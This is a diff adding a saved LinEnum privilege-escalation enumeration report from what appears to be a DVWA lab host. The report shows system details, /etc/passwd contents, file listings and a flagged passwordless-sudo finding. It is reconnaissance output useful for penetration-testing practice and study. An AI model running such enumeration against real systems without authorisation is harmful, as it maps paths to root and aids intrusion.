@@ -1,0 +1,3514 @@
+
+[00;31m#########################################################[00m
+[00;31m#[00m [00;33mLocal Linux Enumeration & Privilege Escalation Script[00m [00;31m#[00m
+[00;31m#########################################################[00m
+[00;33m# www.rebootuser.com[00m
+[00;33m# version 0.982[00m
+
+[-] Debug Info
+[+] Report name = linenum-17-11-21
+[+] Thorough tests = Enabled
+
+
+[00;33mScan started at:
+Wed Nov 17 09:06:12 AM UTC 2021
+[00m
+
+[00;33m### SYSTEM ##############################################[00m
+[00;31m[-] Kernel information:[00m
+Linux target2 5.11.0-40-generic #44-Ubuntu SMP Wed Oct 20 16:16:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+
+
+[00;31m[-] Kernel information (continued):[00m
+Linux version 5.11.0-40-generic (buildd@lgw01-amd64-048) (gcc (Ubuntu 10.3.0-1ubuntu1) 10.3.0, GNU ld (GNU Binutils for Ubuntu) 2.36.1) #44-Ubuntu SMP Wed Oct 20 16:16:42 UTC 2021
+
+
+[00;31m[-] Specific release information:[00m
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=21.04
+DISTRIB_CODENAME=hirsute
+DISTRIB_DESCRIPTION="Ubuntu 21.04"
+NAME="Ubuntu"
+VERSION="21.04 (Hirsute Hippo)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 21.04"
+VERSION_ID="21.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=hirsute
+UBUNTU_CODENAME=hirsute
+
+
+[00;31m[-] Hostname:[00m
+target2
+
+
+[00;33m### USER/GROUP ##########################################[00m
+[00;31m[-] Current user/group info:[00m
+uid=1000(dvwa) gid=1000(dvwa) groups=1000(dvwa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+
+
+[00;31m[-] Users that have previously logged onto the system:[00m
+Username         Port     From             Latest
+dvwa             pts/0    192.168.1.86     Wed Nov 17 08:48:39 +0000 2021
+
+
+[00;31m[-] Who else is logged on:[00m
+ 09:06:12 up  2:11,  1 user,  load average: 0.00, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+dvwa     pts/0    192.168.1.86     08:48    4.00s  0.08s  0.00s /bin/bash ./LinEnum.sh -r linenum -t
+
+
+[00;31m[-] Group memberships:[00m
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
+uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
+uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
+uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
+uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm)
+uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=106(tss) gid=111(tss) groups=111(tss)
+uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
+uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
+uid=109(landscape) gid=115(landscape) groups=115(landscape)
+uid=110(pollinate) gid=1(daemon) groups=1(daemon)
+uid=111(usbmux) gid=46(plugdev) groups=46(plugdev)
+uid=112(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
+uid=1000(dvwa) gid=1000(dvwa) groups=1000(dvwa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+uid=998(lxd) gid=100(users) groups=100(users)
+uid=113(mysql) gid=117(mysql) groups=117(mysql)
+
+
+[00;31m[-] It looks like we have some admin users:[00m
+uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm)
+uid=1000(dvwa) gid=1000(dvwa) groups=1000(dvwa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+
+
+[00;31m[-] Contents of /etc/passwd:[00m
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+dvwa:x:1000:1000:dvwa:/home/dvwa:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
+
+
+[00;31m[-] Super user account(s):[00m
+root
+
+
+[00;33m[+] We can sudo without supplying a password![00m
+Matching Defaults entries for dvwa on target2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dvwa may run the following commands on target2:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+
+
+[00;31m[-] Accounts that have recently used sudo:[00m
+/home/dvwa/.sudo_as_admin_successful
+
+
+[00;31m[-] Are permissions on /home directories lax:[00m
+total 12K
+drwxr-xr-x  3 root root 4.0K Nov  9 03:20 .
+drwxr-xr-x 20 root root 4.0K Nov  9 03:14 ..
+drwxr-x---  4 dvwa dvwa 4.0K Nov 17 09:06 dvwa
+
+
+[00;31m[-] Files owned by our user:[00m
+-rw------- 1 dvwa dvwa 6762 Nov 17 08:48 /home/dvwa/.bash_history
+-rw-r--r-- 1 dvwa dvwa 0 Nov  9 03:21 /home/dvwa/.sudo_as_admin_successful
+-rw-r--r-- 1 dvwa dvwa 220 Mar 19  2021 /home/dvwa/.bash_logout
+-rw-rw-r-- 1 dvwa dvwa 140 Nov  9 04:26 /home/dvwa/your_init_file.sql
+-rw------- 1 dvwa dvwa 40 Nov  9 03:34 /home/dvwa/.local/share/nano/search_history
+-rw-rw-r-- 1 dvwa dvwa 6818 Nov 17 09:06 /home/dvwa/linenum-17-11-21
+-rw------- 1 dvwa dvwa 1742 Nov  9 03:40 /home/dvwa/.viminfo
+-rw-r--r-- 1 dvwa dvwa 3771 Mar 19  2021 /home/dvwa/.bashrc
+-rw-r--r-- 1 dvwa dvwa 807 Mar 19  2021 /home/dvwa/.profile
+-rwxrwxr-x 1 dvwa dvwa 46631 Nov 17 09:02 /home/dvwa/LinEnum.sh
+-rw-rw-r-- 1 dvwa dvwa 215 Nov 17 09:02 /home/dvwa/.wget-hsts
+-rw-r--r-- 1 dvwa dvwa 0 Nov  9 03:21 /home/dvwa/.cache/motd.legal-displayed
+-rw-r--r-- 1 dvwa dvwa 405 Nov 17 08:48 /run/user/1000/systemd/generator.late/app-snap-userd-autostart-autostart.service
+---------- 1 dvwa dvwa 0 Nov 17 08:48 /run/user/1000/systemd/inaccessible/reg
+
+
+[00;31m[-] Hidden files:[00m
+-rw-r--r-- 1 root root 44 Feb 14  2021 /usr/src/linux-headers-5.11.0-40/scripts/dtc/.gitignore
+-rw-r--r-- 1 root root 44 Feb 14  2021 /usr/src/linux-headers-5.11.0-40/scripts/selinux/mdp/.gitignore
+-rw-r--r-- 1 root root 51 Feb 14  2021 /usr/src/linux-headers-5.11.0-40/scripts/selinux/genheaders/.gitignore
+-rw-r--r-- 1 root root 65 Feb 14  2021 /usr/src/linux-headers-5.11.0-40/scripts/gdb/linux/.gitignore
+-rw-r--r-- 1 root root 95 Feb 14  2021 /usr/src/linux-headers-5.11.0-40/scripts/mod/.gitignore
+-rw-r--r-- 1 root root 123 Feb 14  2021 /usr/src/linux-headers-5.11.0-40/scripts/kconfig/.gitignore
+-rw-r--r-- 1 root root 49 Feb 14  2021 /usr/src/linux-headers-5.11.0-40/scripts/genksyms/.gitignore
+-rw-r--r-- 1 root root 64 Feb 14  2021 /usr/src/linux-headers-5.11.0-40/scripts/gcc-plugins/.gitignore
+-rw-r--r-- 1 root root 47 Feb 14  2021 /usr/src/linux-headers-5.11.0-40/scripts/basic/.gitignore
+-rw-r--r-- 1 root root 151 Feb 14  2021 /usr/src/linux-headers-5.11.0-40/scripts/.gitignore
+-rw-r--r-- 1 root root 253543 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/.config
+-rw-r--r-- 1 root root 1061 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/.missing-syscalls.d
+-rw-r--r-- 1 root root 15632 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/kernel/.bounds.s.cmd
+-rw-r--r-- 1 root root 415 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/.kallsyms.cmd
+-rw-r--r-- 1 root root 515 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/.recordmcount.cmd
+-rw-r--r-- 1 root root 2850 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/selinux/mdp/.mdp.cmd
+-rw-r--r-- 1 root root 1463 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/selinux/genheaders/.genheaders.cmd
+-rw-r--r-- 1 root root 499 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/mod/.mk_elfconfig.cmd
+-rw-r--r-- 1 root root 705 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/mod/.file2alias.o.cmd
+-rw-r--r-- 1 root root 580 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/mod/.sumversion.o.cmd
+-rw-r--r-- 1 root root 3199 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/mod/.empty.o.cmd
+-rw-r--r-- 1 root root 104 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/mod/.elfconfig.h.cmd
+-rw-r--r-- 1 root root 936 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/mod/.modpost.o.cmd
+-rw-r--r-- 1 root root 131 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/mod/.modpost.cmd
+-rw-r--r-- 1 root root 7058 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/mod/.devicetable-offsets.s.cmd
+-rw-r--r-- 1 root root 485 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/.insert-sys-cert.cmd
+-rw-r--r-- 1 root root 177 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/kconfig/.parser.tab.h.cmd
+-rw-r--r-- 1 root root 763 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/kconfig/.util.o.cmd
+-rw-r--r-- 1 root root 783 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/kconfig/.symbol.o.cmd
+-rw-r--r-- 1 root root 130 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/kconfig/.lexer.lex.c.cmd
+-rw-r--r-- 1 root root 842 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/kconfig/.confdata.o.cmd
+-rw-r--r-- 1 root root 960 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/kconfig/.parser.tab.o.cmd
+-rw-r--r-- 1 root root 268 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/kconfig/.conf.cmd
+-rw-r--r-- 1 root root 831 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/kconfig/.lexer.lex.o.cmd
+-rw-r--r-- 1 root root 763 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/kconfig/.expr.o.cmd
+-rw-r--r-- 1 root root 823 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/kconfig/.preprocess.o.cmd
+-rw-r--r-- 1 root root 763 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/kconfig/.conf.o.cmd
+-rw-r--r-- 1 root root 433 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/.sign-file.cmd
+-rw-r--r-- 1 root root 463 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/.extract-cert.cmd
+-rw-r--r-- 1 root root 622 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/genksyms/.parse.tab.o.cmd
+-rw-r--r-- 1 root root 127 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/genksyms/.lex.lex.c.cmd
+-rw-r--r-- 1 root root 667 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/genksyms/.lex.lex.o.cmd
+-rw-r--r-- 1 root root 217 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/genksyms/.parse.tab.c.cmd
+-rw-r--r-- 1 root root 155 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/genksyms/.genksyms.cmd
+-rw-r--r-- 1 root root 593 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/genksyms/.genksyms.o.cmd
+-rw-r--r-- 1 root root 636 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/.asn1_compiler.cmd
+-rw-r--r-- 1 root root 385 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/.bin2c.cmd
+-rw-r--r-- 1 root root 674 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/.sorttable.cmd
+-rw-r--r-- 1 root root 591 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/scripts/basic/.fixdep.cmd
+-rw-r--r-- 1 root root 7941 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/.main.o.cmd
+-rw-r--r-- 1 root root 3489 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/.ctype.o.cmd
+-rw-r--r-- 1 root root 3825 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/.zalloc.o.cmd
+-rw-r--r-- 1 root root 462 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/.fixdep-in.o.cmd
+-rw-r--r-- 1 root root 4422 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/.fixdep.o.d
+-rw-r--r-- 1 root root 5358 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/.fixdep.o.cmd
+-rw-r--r-- 1 root root 1656 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.subcmd-config.o.cmd
+-rw-r--r-- 1 root root 6081 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.help.o.d
+-rw-r--r-- 1 root root 7466 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.help.o.cmd
+-rw-r--r-- 1 root root 6565 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.run-command.o.d
+-rw-r--r-- 1 root root 4214 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.sigchain.o.d
+-rw-r--r-- 1 root root 5164 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.pager.o.d
+-rw-r--r-- 1 root root 1454 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.libsubcmd-in.o.cmd
+-rw-r--r-- 1 root root 226 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.subcmd-config.o.d
+-rw-r--r-- 1 root root 4567 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.parse-options.o.d
+-rw-r--r-- 1 root root 6515 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.exec-cmd.o.cmd
+-rw-r--r-- 1 root root 5619 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.sigchain.o.cmd
+-rw-r--r-- 1 root root 7985 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.run-command.o.cmd
+-rw-r--r-- 1 root root 5110 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.exec-cmd.o.d
+-rw-r--r-- 1 root root 6554 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.pager.o.cmd
+-rw-r--r-- 1 root root 5997 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libsubcmd/.parse-options.o.cmd
+-rw-r--r-- 1 root root 4150 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/.rbtree.o.cmd
+-rw-r--r-- 1 root root 4080 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/.str_error_r.o.cmd
+-rw-r--r-- 1 root root 5566 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/.string.o.cmd
+-rw-r--r-- 1 root root 1210 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/.resolve_btfids-in.o.cmd
+-rw-r--r-- 1 root root 5452 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf_errno.o.cmd
+-rw-r--r-- 1 root root 8914 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf.o.d
+-rw-r--r-- 1 root root 6916 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.bpf.o.cmd
+-rw-r--r-- 1 root root 4771 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.hashmap.o.d
+-rw-r--r-- 1 root root 7927 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.xsk.o.d
+-rw-r--r-- 1 root root 7572 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.btf.o.d
+-rw-r--r-- 1 root root 9043 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.btf.o.cmd
+-rw-r--r-- 1 root root 6324 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.ringbuf.o.d
+-rw-r--r-- 1 root root 8338 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.netlink.o.cmd
+-rw-r--r-- 1 root root 10400 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf.o.cmd
+-rw-r--r-- 1 root root 6882 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf_probes.o.d
+-rw-r--r-- 1 root root 8403 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf_probes.o.cmd
+-rw-r--r-- 1 root root 3214 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.str_error.o.cmd
+-rw-r--r-- 1 root root 5445 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.bpf.o.d
+-rw-r--r-- 1 root root 6666 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.bpf_prog_linfo.o.cmd
+-rw-r--r-- 1 root root 6262 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.hashmap.o.cmd
+-rw-r--r-- 1 root root 2504 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf-in.o.cmd
+-rw-r--r-- 1 root root 9398 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.xsk.o.cmd
+-rw-r--r-- 1 root root 6847 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.netlink.o.d
+-rw-r--r-- 1 root root 7112 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.nlattr.o.cmd
+-rw-r--r-- 1 root root 5626 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.nlattr.o.d
+-rw-r--r-- 1 root root 7815 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.ringbuf.o.cmd
+-rw-r--r-- 1 root root 5493 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.btf_dump.o.d
+-rw-r--r-- 1 root root 3936 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf_errno.o.d
+-rw-r--r-- 1 root root 6989 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.btf_dump.o.cmd
+-rw-r--r-- 1 root root 5140 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.bpf_prog_linfo.o.d
+-rw-r--r-- 1 root root 1713 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.str_error.o.d
+-rw-r--r-- 1 root root 1962 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.subcmd-config.o.cmd
+-rw-r--r-- 1 root root 6125 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.libstring.o.cmd
+-rw-r--r-- 1 root root 9376 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.orc_gen.o.cmd
+-rw-r--r-- 1 root root 8422 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.weak.o.cmd
+-rw-r--r-- 1 root root 9663 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.orc_dump.o.cmd
+-rw-r--r-- 1 root root 429 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.fixdep-in.o.cmd
+-rw-r--r-- 1 root root 7900 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.help.o.cmd
+-rw-r--r-- 1 root root 4411 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.fixdep.o.d
+-rw-r--r-- 1 root root 5292 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.fixdep.o.cmd
+-rw-r--r-- 1 root root 1265 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.libsubcmd-in.o.cmd
+-rw-r--r-- 1 root root 4585 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.librbtree.o.cmd
+-rw-r--r-- 1 root root 9332 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.objtool.o.cmd
+-rw-r--r-- 1 root root 6930 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.exec-cmd.o.cmd
+-rw-r--r-- 1 root root 6006 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.sigchain.o.cmd
+-rw-r--r-- 1 root root 3924 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.libctype.o.cmd
+-rw-r--r-- 1 root root 9490 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.special.o.cmd
+-rw-r--r-- 1 root root 4700 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.str_error_r.o.cmd
+-rw-r--r-- 1 root root 8465 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.run-command.o.cmd
+-rw-r--r-- 1 root root 6961 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.pager.o.cmd
+-rw-r--r-- 1 root root 2223 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.objtool-in.o.cmd
+-rw-r--r-- 1 root root 9677 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.check.o.cmd
+-rw-r--r-- 1 root root 10320 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/arch/x86/.decode.o.cmd
+-rw-r--r-- 1 root root 8970 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/arch/x86/.special.o.cmd
+-rw-r--r-- 1 root root 603 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/arch/x86/.objtool-in.o.cmd
+-rw-r--r-- 1 root root 6422 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.parse-options.o.cmd
+-rw-r--r-- 1 root root 9794 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.elf.o.cmd
+-rw-r--r-- 1 root root 8608 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.builtin-orc.o.cmd
+-rw-r--r-- 1 root root 8630 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/tools/objtool/.builtin-check.o.cmd
+-rw-r--r-- 1 root root 357 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd
+-rw-r--r-- 1 root root 245 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd
+-rw-r--r-- 1 root root 273 Oct 20 14:15 /usr/src/linux-headers-5.11.0-40-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd
